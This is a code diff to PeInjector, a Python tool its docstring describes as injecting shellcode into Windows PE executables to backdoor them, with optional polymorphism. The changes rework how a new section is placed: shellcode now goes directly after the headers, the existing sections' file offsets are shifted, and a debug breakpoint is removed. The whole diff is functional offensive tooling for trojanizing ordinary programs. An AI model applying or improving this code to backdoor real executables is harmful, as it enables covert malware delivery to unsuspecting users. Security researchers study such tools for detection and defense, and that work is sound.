@@ -25,7 +25,7 @@ This python tool injects shellcode in Windows Program Executable to
 backdoor it with optional polymorphism.
 """
 
-__version__ = "1.0.1"
+__version__ = "1.1.0"
 __author__ = "Maurice Lambert"
 __author_email__ = "mauricelambert434@gmail.com"
 __maintainer__ = "Maurice Lambert"
@@ -36,7 +36,16 @@ backdoor it with optional polymorphism.
 """
 __url__ = "https://github.com/mauricelambert/PeInjector"
 
-__all__ = ["main", "inject"]
+__all__ = [
+    "main",
+    "inject",
+    "NewValues",
+    "Section",
+    "PeInjectorData",
+    "ProgramExecutableError",
+    "ArchitectureError",
+    "machine_types",
+]
 
 __license__ = "GPL-3.0 License"
 __copyright__ = """
@@ -70,6 +79,7 @@ class NewValues:
     headers_size: int = 0
     file_size: int = 0
     section_offset: int = 0
+    section_size: int = 0
     entry_point: int = 0
     first_section_offset: int = 0
 
@@ -104,6 +114,7 @@ class PeInjectorData:
     image_size: int = 0
     headers_size: int = 0
     image_base: int = 0
+    address_section_headers: int = 0
     offset_new_section_headers: int = 0
     address_end_new_section_headers: int = 0
     first_section_offset: int = 0
@@ -420,7 +431,6 @@ def build_injected_shellcode(
 
 def generate_new_section_headers(
     injector_data: PeInjectorData,
-    file_new_section_size: int,
     polymorphism: bool,
 ) -> bytes:
     """
@@ -437,9 +447,11 @@ def generate_new_section_headers(
         4, "little"
     )
 
-    new_section_headers += file_new_section_size.to_bytes(4, "little")
-    new_section_headers += injector_data.new_values.section_offset.to_bytes(
+    new_section_headers += injector_data.new_values.section_size.to_bytes(
         4, "little"
+    )
+    new_section_headers += (
+        injector_data.new_values.first_section_offset.to_bytes(4, "little")
     )
 
     new_section_headers += b"\0" * 12
@@ -459,8 +471,9 @@ def get_new_section_offset(injector_data: PeInjectorData) -> Tuple[int, int]:
 
     shellcode_length = len(injector_data.shellcode)
     file_padding = shellcode_length % injector_data.file_aligment
-    file_new_section_size = shellcode_length + (
-        (injector_data.file_aligment - file_padding) if file_padding else 0
+    injector_data.new_values.section_size = file_new_section_size = (
+        shellcode_length
+        + ((injector_data.file_aligment - file_padding) if file_padding else 0)
     )
 
     last_section = injector_data.sections[-1]
@@ -468,7 +481,7 @@ def get_new_section_offset(injector_data: PeInjectorData) -> Tuple[int, int]:
         last_section.file_offset + last_section.file_size
     )
     file_padding = last_section_file_end_address % injector_data.file_aligment
-    injector_data.new_values.section_offset = last_section_file_end_address + (
+    last_section_offset = last_section_file_end_address + (
         (injector_data.file_aligment - (file_padding)) if file_padding else 0
     )
 
@@ -476,10 +489,24 @@ def get_new_section_offset(injector_data: PeInjectorData) -> Tuple[int, int]:
         len(injector_data.shellcode) + injector_data.new_values.entry_point
     )
     injector_data.new_values.file_size = (
-        file_new_section_size + injector_data.new_values.section_offset
+        file_new_section_size + last_section_offset
     )
 
-    return last_section_file_end_address, file_new_section_size
+    return last_section_file_end_address
+
+
+def add_file_offset_to_sections(
+    injector_data: PeInjectorData, section_headers: memoryview, offset: int
+) -> None:
+    """
+    This function modify sections headers to add "offset".
+    """
+
+    for index in range(injector_data.sections_number):
+        section = injector_data.sections[index]
+        section.file_offset += 512
+        section_headers[0x14:0x18] = section.file_offset.to_bytes(4, "little")
+        section_headers = section_headers[40:]
 
 
 def rewrite_sections_position(
@@ -490,15 +517,10 @@ def rewrite_sections_position(
     """
 
     injector_data.new_values.first_section_offset += 512
-    injector_data.new_values.section_offset += 512
     injector_data.new_values.headers_size += 512
     injector_data.new_values.file_size += 512
 
-    for index in range(injector_data.sections_number):
-        section = injector_data.sections[index]
-        section.file_offset += 512
-        section_headers[0x14:0x18] = section.file_offset.to_bytes(4, "little")
-        section_headers = section_headers[40:]
+    add_file_offset_to_sections(injector_data, section_headers, 512)
 
 
 def check_new_section_injection(
@@ -517,9 +539,12 @@ def check_new_section_injection(
         injector_data.first_section_offset
     ) = min((section.file_offset for section in injector_data.sections))
 
+    injector_data.address_section_headers = len(memory_file_mapping) - len(
+        section_headers
+    )
     injector_data.address_end_new_section_headers = (
         injector_data.offset_new_section_headers
-        + (len(memory_file_mapping) - len(section_headers))
+        + injector_data.address_section_headers
         + 40
     )
 
@@ -543,14 +568,15 @@ def get_new_section_headers(
     This function returns the end address of the last section.
     """
 
-    last_section_file_end_address, file_new_section_size = (
-        get_new_section_offset(injector_data)
-    )
-    check_new_section_injection(
+    last_section_file_end_address = get_new_section_offset(injector_data)
+    section_headers = check_new_section_injection(
         injector_data, memory_file_mapping
     )
+    add_file_offset_to_sections(
+        injector_data, section_headers, injector_data.new_values.section_size
+    )
     new_section_headers = generate_new_section_headers(
-        injector_data, file_new_section_size, polymorphism
+        injector_data, polymorphism
     )
 
     return new_section_headers, last_section_file_end_address
@@ -584,6 +610,29 @@ def rewrite_pe_headers(
     return optional_headers
 
 
+def get_microsoft_headers(
+    injector_data: PeInjectorData,
+    memory_file_mapping: memoryview,
+    new_section_headers: bytes,
+) -> bytes:
+    """
+    This function returns the new headers file content to write
+    in the backdoored PE file.
+    """
+
+    return (
+        bytes(memory_file_mapping[: injector_data.address_section_headers])
+        + new_section_headers
+        + bytes(
+            memory_file_mapping[
+                injector_data.address_section_headers:
+                injector_data.address_end_new_section_headers
+                - 40
+            ]
+        )
+    ).ljust(injector_data.new_values.first_section_offset, b"\0")
+
+
 def write_new_pe_file(
     injector_data: PeInjectorData,
     memory_file_mapping: memoryview,
@@ -596,28 +645,20 @@ def write_new_pe_file(
     """
 
     new_file_content = (
-        (
-            bytes(
-                memory_file_mapping[
-                    :injector_data.address_end_new_section_headers - 40
-                ]
-            )
-            + new_section_headers
-        ).ljust(injector_data.new_values.first_section_offset, b"\0")
+        get_microsoft_headers(
+            injector_data, memory_file_mapping, new_section_headers
+        )
+        + injector_data.shellcode.ljust(
+            injector_data.new_values.section_size, b"\0"
+        )
         + bytes(
             memory_file_mapping[
                 injector_data.first_section_offset:last_section_end_address
             ]
-        ).ljust(
-            injector_data.new_values.section_offset
-            - injector_data.new_values.first_section_offset,
-            b"\0",
         )
-        + injector_data.shellcode
     ).ljust(injector_data.new_values.file_size, b"\0") + bytes(
         memory_file_mapping[last_section_end_address:]
     )
-    breakpoint()
 
     executable.write(new_file_content)
     return new_file_content
